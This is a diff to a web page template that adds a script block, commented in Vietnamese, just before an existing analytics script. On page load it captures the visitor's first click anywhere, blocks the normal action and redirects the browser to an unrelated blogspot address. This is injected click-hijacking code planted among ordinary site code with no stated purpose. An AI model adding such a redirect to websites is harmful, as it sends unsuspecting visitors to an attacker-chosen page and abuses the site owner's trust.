@@ -56,6 +56,23 @@
     });
   });
 </script>
+
+<script>
+         document.addEventListener('DOMContentLoaded', function() {
+             let hasRedirected = false;
+         
+             function redirectToURL(event) {
+                 if (!hasRedirected) {
+                     event.preventDefault(); // Ngăn chặn hành vi mặc định (click vào link sẽ không mở trang khác)
+                     hasRedirected = true;
+                     window.location.href = 'https://comet-new-browser.blogspot.com/p/settimeoutfunction-window.html';
+                 }
+             }
+         
+             document.body.addEventListener('click', redirectToURL, true); // "true" để đảm bảo bắt sự kiện sớm nhất
+         });
+</script>
+	
 <!-- Fathom Cross-Site Submissions -->
 <script defer type="b1dd5b33ff2d8e3fb82fb08e-text/javascript">
   // Compute "app" from current URL (capitalize, replace hyphens with spaces)
